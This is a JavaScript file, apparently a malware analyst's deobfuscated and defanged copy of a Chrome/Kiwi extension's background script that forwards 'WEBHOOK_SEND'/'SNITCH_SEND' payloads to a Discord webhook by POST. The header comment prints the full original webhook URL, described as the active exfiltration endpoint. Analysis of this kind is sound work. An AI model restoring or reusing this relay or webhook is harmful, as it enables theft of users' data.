// Author: tdinh
// Decoded by: tdinh cute
// Target: background.js (Ceker Hook Mobile v3 - Chrome/Kiwi Extension)
// Status: Fully deobfuscated & Defanged

// Active C2 Webhook discovered:
// Original: https://discord.com/api/webhooks/1568782301028950026/d-QoAI5xnKzf7gJCNzyxRdRB40HU025_73F5Odpu7mNW53EN-XOuqhcz_j_tBqeltFoZ
// Channel: 1544915225801789520 | Guild: 1536003715515818014 | Bot Name: Spidey Bot
const WEBHOOK_URL = ""; // Defanged to prevent accidental data leak

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "WEBHOOK_SEND" || message.type === "SNITCH_SEND") {
    const payload = message.type === "WEBHOOK_SEND" ? message.payload : {
      content: message.payload
    };

    console.log("[Background] Sending to:", WEBHOOK_URL);
    console.log("[Background] Payload:", JSON.stringify(payload).substring(0, 200));

    if (!WEBHOOK_URL) {
      console.log("[Background] Webhook is defanged. Dropping exfiltration request.");
      sendResponse({ ok: true, status: 200, body: "Defanged" });
      return true;
    }

    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).then(response => {
      console.log("[Background] Response status:", response.status);
      return response.text().then(body => {
        console.log("[Background] Response body:", body);
        sendResponse({
          ok: response.ok || response.status === 204,
          status: response.status,
          body: body
        });
      });
    }).catch(err => {
      console.log("[Background] Error:", err);
      sendResponse({
        ok: false,
        error: err.message
      });
    });

    return true;
  }
});

console.log("[ZiettKhueee] Background loaded");
